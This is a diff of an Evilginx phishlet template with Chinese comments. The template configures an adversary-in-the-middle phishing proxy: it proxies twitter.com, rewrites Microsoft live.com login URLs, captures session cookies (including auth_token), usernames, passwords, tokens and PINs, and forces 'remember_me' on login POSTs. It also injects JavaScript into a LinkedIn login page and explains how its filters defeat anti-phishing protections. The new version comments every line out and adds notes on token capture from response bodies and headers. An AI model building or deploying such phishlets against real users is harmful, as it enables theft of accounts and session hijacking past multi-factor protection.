@@ -1,98 +1,126 @@
-### 创建者的句柄或名称
-author: '@mrgretzky'
-### 该 phishlet 兼容的 Evilginx 最低版本是多少  范围 2.0.0 - 3.2.0
-min_ver: '2.3.0'
-proxy_hosts: ### 用于代理访问者和合法主机之间流量的所有子域和域
-  - {
-    phish_sub: '', # 指定网络钓鱼主机名中的子域。它可以与原始子域相同
-    orig_sub: '', # 代理网站主机名的原始子域
-    domain: 'twitter.com', # 代理流量的合法网站的基本域
-    session: true, # 将此参数设置为true用于处理主网站 HTML 内容并且其主机名在浏览器的 URL 栏中可见的主机。为特定主机设置此项true将确保该主机的响应将包含会话 cookie、凭据和其他值得捕获的数据。如果它是提供静态内容（例如javascript）的主机，您可以安全地将此参数设置为false
-    is_landing: true # 如果设置true为此主机将用于生成网络钓鱼 URL。将其设置为true仅适用于显示初始登录页面的一台主机。
-    # auto_filter   如果设置为true（默认）proxy with，请尝试自动为此主机创建所需的子筛选器，而无需手动指定它们。
-  }
-  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
-sub_filters: ### 定义以动态修改代理网站内容的所有字符串替换过滤器
-  ###  这对于用网络钓鱼代理 URL 替换所有出现的合法网站 URL 非常重要，以防止浏览器在访问者完成身份验证过程之前将其重定向到合法网站。过滤器还可用于删除或修改 javascript 反网络钓鱼安全措施。
-  - {
-    triggers_on: 'login.live.com',  #将为其触发过滤器的原始主机名。访问者和定义的合法主机之间的代理数据（该参数的值）将触发此替换过滤器。选择 Evilginx 代理将动态修改代理主机的通信
-    orig_sub: 'login', # 将在所有出现的字符串搜索中使用的合法主机的子域名
-    domain: 'live.com', # 将在所有出现的字符串搜索中使用的合法主机的域名
-    search: 'https://{hostname}/ppsecure/', ## 用于搜索响应正文中出现的字符串的正则表达式。还支持正则表达式组。请参阅下面您可以使用的受支持的自动填充变量的列表
-    replace: 'https://{hostname}/ppsecure/', ## 将替换所有与正则表达式匹配的字符串的字符串search。如果在字段中定义了正则表达式组search，请在此处引用它们，例如${1}where1是组索引。请参阅下面您可以使用的受支持的自动填充变量的列表
-    mimes: ['text/html', 'application/json', 'application/javascript'] # 过滤只会触发Content-Type标头值等于此处定义的任何 MIME 类型的响应数据包。
-    #redirect_only: true  表示仅在生成网络钓鱼 URL 时指定重定向 URL 时才会触发过滤器
-    # with_params （字符串数组）：仅当以下所有自定义参数均随网络钓鱼 URL 一起传递时才启用此过滤器。
-    ## 自动填充变量
-    # search您可以在和字段中使用以下自动填充变量replace：
-      # { hostname }：当在search字段中使用时，它将成为由orig_sub和组合而成的主机名domain，在同一条目中定义sub_filter。在现场使用时replace，通过查找proxy_hosts部分中配置的条目，组合主机名将自动转换为相应的网络钓鱼主机名。这对于将响应中出现的所有网站原始主机名替换为网络钓鱼主机名非常有用。
-      # { subdomain }：与 作用相同{ hostname }，但仅引用orig_subfield 中定义的子域。
-      # { domain }：与 作用相同{ hostname }，但仅引用domainfield 中定义的域。
-      # { hostname_regexp }：相当于{ hostname }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
-      # { subdomain_regexp }：相当于{ subdomain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
-      # { domain_regexp }：相当于{ domain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
-  }
-  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-auth_tokens: ### 定义应在传输的代理响应中捕获的所有 cookie。这些 cookie 应定义经过身份验证的用户会话的完整状态，从而允许网站识别登录的用户。当所有定义的 cookie 被拦截和捕获时，会话将被记录，并且网络钓鱼攻击被认为是成功的。此时，用户将被重定向到初始网络钓鱼 URL 中指定的 URL。
-  - domain: '.twitter.com' # 与 HTTP 响应数据包中收到的域完全相同。开头.的 表示将为该域的所有子域发送 cookie。
-    keys: ['kdt','_twitter_sess','twid','auth_token'] # 将搜索和捕获的 cookie 的确切名称。每个键的可用修饰符是regexp和opt（见下文）。
-  # 键修饰符
-   #regexp：将 cookie 名称视为正则表达式。例如 key'frog-[0-9]{3},regexp'将查找任何像frog-283, frog-111,之类的键frog-291来捕获。重要的！如果您至少使用一个正则表达式修改的键，请确保使用auth_urls（如下所述）触发会话捕获。
-   #opt：将该 cookie 视为可选。如果该 cookie 到达，它将被捕获，但如果它没有到达并且其他所需的 cookie 已被捕获，则会话将被视为已完成。
-credentials: ### 您可以在此部分指定应捕获哪些 POST 参数以及其中哪些是用户凭据。
-  username: # 为捕获的凭据的用户名/登录名/电子邮件部分定义 POST 参数。
-    key: 'email' ## 要匹配的 POST 参数名称的正则表达式。type如果设置为则忽略此设置json
-    search: '(.*)' ## 正则表达式，用于搜索检测到的 POST 参数的值 ( type== post) 或搜索整个 JSON 字符串 ( type== json)。要捕获的值是从正则表达式的第一个定义的组中捕获的
-    type: 'post' ## 定义将发送的请求的内容类型。允许的类型：json, post （默认）。
-  password: # 定义用于捕获用户密码的POST参数。
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-  custom: # 定义用于附加存储的可选 POST 参数数组。如果您需要从附加表单字段捕获特定令牌或 PIN，则可以使用它。
-    - key: 'token'
-      search: '(.*)'
-      type: 'post'
-    - key: 'pin'
-      search: '([0-9]*)'
-      type: 'post'
-
-auth_urls: ### auth_tokens默认情况下，当捕获节中定义的所有 cookie 时，Evilginx 会认为会话已通过身份验证。例外情况是，您需要捕获的 cookie 名称是动态生成的。在这种情况下，您需要使用正则表达式来搜索会话 cookie 或捕获所有会话 cookie。然后，Evilginx 将不知道何时捕获了所有会话 cookie，并且需要另一种方法来触发成功的会话捕获。
-  ###当向任何定义的 URL 路径发出请求时，会话将被视为已捕获。这些 URL 路径只有在用户成功通过身份验证后才能访问，从而表明身份验证成功。
-  - '/home'
-login: ### 定义网络钓鱼网站上的登录页面所在的位置domain。path
-  domain: 'www.linkedin.com'
-  path: '/uas/login'
-
-force_post: ### 传输中添加到现有 POST 请求中的 POST 参数。这对于强制网络钓鱼用户在启用“记住我”选项的情况下进行身份验证非常有用，即使他们在登录表单上明确未选中复选框
-  - path: '/sessions' ## 匹配截获的 POST 请求将发送到的 URL 路径的正则表达式
-    search: ##  POST 参数。此处定义的所有POST 参数必须出现在 POST 请求中，以便插入或替换 POST 参数
-      - {key: 'session\[user.*\]', search: '.*'} # ：匹配 POST 参数键的正则表达式
-      - {key: 'session\[pass[a-z]{4}\]', search: '.*'} # 匹配 POST 参数值的正则表达式
-    force: # 要在拦截的 POST 请求中插入或替换的 POST 参数列表
-      - {key: 'remember_me', value: '1'} # POST 参数的名称 POST 参数的值
-    type: 'post' # 要处理的 POST 请求的类型。目前仅post支持
-
-js_inject:  # 您想要注入代理页面的所有 Javascript 脚本。每个脚本都可以使用{var_name}可变参数进行自定义，稍后可以在每个创建的lure
-  - trigger_domains: ["www.linkedin.com"] # 将触发注入的所有主机名。
-    trigger_paths: ["/uas/login"] # 将触发注入的所有 URL 路径的正则表达式
-    trigger_params: ["email"] # 仅当以下参数在lure
-    script: | # 将在标签之前注入的 Javascript 代码</body>
-      function lp(){
-        var email = document.querySelector("#username");
-        var password = document.querySelector("#password");
-        if (email != null && password != null) {
-          email.value = "{email}";
-          password.focus();
-          return;
-        }
-        setTimeout(function(){lp();}, 100);
-      }
-      setTimeout(function(){lp();}, 100);
+#### 创建者的句柄或名称
+#author: '@mrgretzky'
+#### 该 phishlet 兼容的 Evilginx 最低版本是多少  范围 2.0.0 - 3.2.0
+#min_ver: '3.2.0'
+#proxy_hosts: ### 用于代理访问者和合法主机之间流量的所有子域和域
+#  - {
+#    phish_sub: '', # 指定网络钓鱼主机名中的子域。它可以与原始子域相同
+#    orig_sub: '', # 代理网站主机名的原始子域
+#    domain: 'twitter.com', # 代理流量的合法网站的基本域
+#    session: true, # 将此参数设置为true用于处理主网站 HTML 内容并且其主机名在浏览器的 URL 栏中可见的主机。为特定主机设置此项true将确保该主机的响应将包含会话 cookie、凭据和其他值得捕获的数据。如果它是提供静态内容（例如javascript）的主机，您可以安全地将此参数设置为false
+#    is_landing: true # 如果设置true为此主机将用于生成网络钓鱼 URL。将其设置为true仅适用于显示初始登录页面的一台主机。
+#    # auto_filter   如果设置为true（默认）proxy with，请尝试自动为此主机创建所需的子筛选器，而无需手动指定它们。
+#  }
+#  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
+#sub_filters: ### 定义以动态修改代理网站内容的所有字符串替换过滤器
+#  ###  这对于用网络钓鱼代理 URL 替换所有出现的合法网站 URL 非常重要，以防止浏览器在访问者完成身份验证过程之前将其重定向到合法网站。过滤器还可用于删除或修改 javascript 反网络钓鱼安全措施。
+#  - {
+#    triggers_on: 'login.live.com',  #将为其触发过滤器的原始主机名。访问者和定义的合法主机之间的代理数据（该参数的值）将触发此替换过滤器。选择 Evilginx 代理将动态修改代理主机的通信
+#    orig_sub: 'login', # 将在所有出现的字符串搜索中使用的合法主机的子域名
+#    domain: 'live.com', # 将在所有出现的字符串搜索中使用的合法主机的域名
+#    search: 'https://{hostname}/ppsecure/', ## 用于搜索响应正文中出现的字符串的正则表达式。还支持正则表达式组。请参阅下面您可以使用的受支持的自动填充变量的列表
+#    replace: 'https://{hostname}/ppsecure/', ## 将替换所有与正则表达式匹配的字符串的字符串search。如果在字段中定义了正则表达式组search，请在此处引用它们，例如${1}where1是组索引。请参阅下面您可以使用的受支持的自动填充变量的列表
+#    mimes: ['text/html', 'application/json', 'application/javascript'] # 过滤只会触发Content-Type标头值等于此处定义的任何 MIME 类型的响应数据包。
+#    #redirect_only: true  表示仅在生成网络钓鱼 URL 时指定重定向 URL 时才会触发过滤器
+#    # with_params （字符串数组）：仅当以下所有自定义参数均随网络钓鱼 URL 一起传递时才启用此过滤器。
+#    ## 自动填充变量
+#    # search您可以在和字段中使用以下自动填充变量replace：
+#      # { hostname }：当在search字段中使用时，它将成为由orig_sub和组合而成的主机名domain，在同一条目中定义sub_filter。在现场使用时replace，通过查找proxy_hosts部分中配置的条目，组合主机名将自动转换为相应的网络钓鱼主机名。这对于将响应中出现的所有网站原始主机名替换为网络钓鱼主机名非常有用。
+#      # { subdomain }：与 作用相同{ hostname }，但仅引用orig_subfield 中定义的子域。
+#      # { domain }：与 作用相同{ hostname }，但仅引用domainfield 中定义的域。
+#      # { hostname_regexp }：相当于{ hostname }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+#      # { subdomain_regexp }：相当于{ subdomain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+#      # { domain_regexp }：相当于{ domain }，但每个自动翻译的字符串都经过正确转义以在正则表达式中使用。有时需要绕过涉及正则表达式的反网络钓鱼保护。
+#  }
+#  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#auth_tokens: ### 定义应在传输的代理响应中捕获的所有 cookie。这些 cookie 应定义经过身份验证的用户会话的完整状态，从而允许网站识别登录的用户。当所有定义的 cookie 被拦截和捕获时，会话将被记录，并且网络钓鱼攻击被认为是成功的。此时，用户将被重定向到初始网络钓鱼 URL 中指定的 URL。
+#  - domain: '.twitter.com' # 与 HTTP 响应数据包中收到的域完全相同。开头.的 表示将为该域的所有子域发送 cookie。
+#    keys: ['kdt','_twitter_sess','twid','auth_token'] # 将搜索和捕获的 cookie 的确切名称。每个键的可用修饰符是regexp和opt（见下文）。
+#    type: 'cookie' # body
+#  ## 3。0
+#   # cookie
+#      #  auth_tokens:
+#      #    - domain: '.twitter.com'
+#      #      keys: [ 'kdt','_twitter_sess','twid','auth_token' ]
+#      #     type: 'cookie'
+#    #body
+#      #auth_tokens:
+#      #  - domain: 'discord.com'
+#      #    path: '/auth/login'
+#      #    name: 'token'
+#      #    search: '"token":"([^"]*)'
+#      #    type: 'body'
+#    # http
+#      #auth_tokens:
+#      #  - domain: 'discord.com'
+#      #    path: '/api/v9/heartbeat'
+#      #    name: 'token'
+#      #    header: 'authorization'
+#       #   type: 'http'
+#
+#
+#  # 键修饰符
+#   #regexp：将 cookie 名称视为正则表达式。例如 key'frog-[0-9]{3},regexp'将查找任何像frog-283, frog-111,之类的键frog-291来捕获。重要的！如果您至少使用一个正则表达式修改的键，请确保使用auth_urls（如下所述）触发会话捕获。
+#   #opt：将该 cookie 视为可选。如果该 cookie 到达，它将被捕获，但如果它没有到达并且其他所需的 cookie 已被捕获，则会话将被视为已完成。
+#credentials: ### 您可以在此部分指定应捕获哪些 POST 参数以及其中哪些是用户凭据。
+#  username: # 为捕获的凭据的用户名/登录名/电子邮件部分定义 POST 参数。
+#    key: 'email' ## 要匹配的 POST 参数名称的正则表达式。type如果设置为则忽略此设置json
+#    search: '(.*)' ## 正则表达式，用于搜索检测到的 POST 参数的值 ( type== post) 或搜索整个 JSON 字符串 ( type== json)。要捕获的值是从正则表达式的第一个定义的组中捕获的
+#    type: 'post' ## 定义将发送的请求的内容类型。允许的类型：json, post （默认）。
+#  password: # 定义用于捕获用户密码的POST参数。
+#    key: 'password'
+#    search: '(.*)'
+#    type: 'post'
+#  custom: # 定义用于附加存储的可选 POST 参数数组。如果您需要从附加表单字段捕获特定令牌或 PIN，则可以使用它。
+#    - key: 'token'
+#      search: '(.*)'
+#      type: 'post'
+#    - key: 'pin'
+#      search: '([0-9]*)'
+#      type: 'post'
+#
+#auth_urls: ### auth_tokens默认情况下，当捕获节中定义的所有 cookie 时，Evilginx 会认为会话已通过身份验证。例外情况是，您需要捕获的 cookie 名称是动态生成的。在这种情况下，您需要使用正则表达式来搜索会话 cookie 或捕获所有会话 cookie。然后，Evilginx 将不知道何时捕获了所有会话 cookie，并且需要另一种方法来触发成功的会话捕获。
+#  ###当向任何定义的 URL 路径发出请求时，会话将被视为已捕获。这些 URL 路径只有在用户成功通过身份验证后才能访问，从而表明身份验证成功。
+#  - '/home'
+#login: ### 定义网络钓鱼网站上的登录页面所在的位置domain。path
+#  domain: 'www.linkedin.com'
+#  path: '/uas/login'
+#
+#force_post: ### 传输中添加到现有 POST 请求中的 POST 参数。这对于强制网络钓鱼用户在启用“记住我”选项的情况下进行身份验证非常有用，即使他们在登录表单上明确未选中复选框
+#  - path: '/sessions' ## 匹配截获的 POST 请求将发送到的 URL 路径的正则表达式
+#    search: ##  POST 参数。此处定义的所有POST 参数必须出现在 POST 请求中，以便插入或替换 POST 参数
+#      - {key: 'session\[user.*\]', search: '.*'} # ：匹配 POST 参数键的正则表达式
+#      - {key: 'session\[pass[a-z]{4}\]', search: '.*'} # 匹配 POST 参数值的正则表达式
+#    force: # 要在拦截的 POST 请求中插入或替换的 POST 参数列表
+#      - {key: 'remember_me', value: '1'} # POST 参数的名称 POST 参数的值
+#    type: 'post' # 要处理的 POST 请求的类型。目前仅post支持
+#
+#js_inject:  # 您想要注入代理页面的所有 Javascript 脚本。每个脚本都可以使用{var_name}可变参数进行自定义，稍后可以在每个创建的lure
+#  - trigger_domains: ["www.linkedin.com"] # 将触发注入的所有主机名。
+#    trigger_paths: ["/uas/login"] # 将触发注入的所有 URL 路径的正则表达式
+#    trigger_params: ["email"] # 仅当以下参数在lure
+#    script: | # 将在标签之前注入的 Javascript 代码</body>
+#      function lp(){
+#        var email = document.querySelector("#username");
+#        var password = document.querySelector("#password");
+#        if (email != null && password != null) {
+#          email.value = "{email}";
+#          password.focus();
+#          return;
+#        }
+#        setTimeout(function(){lp();}, 100);
+#      }
+#      setTimeout(function(){lp();}, 100);
+#
+#intercept: ### 定义您想要拦截和替换代理连接中的哪些 HTTP 请求的响应
+#  - {domain: 'www.linkedin.com', path: '^\/report_error$', http_status: 200, body: '{"error":0}'', mime: "application/json"}
+#
+#
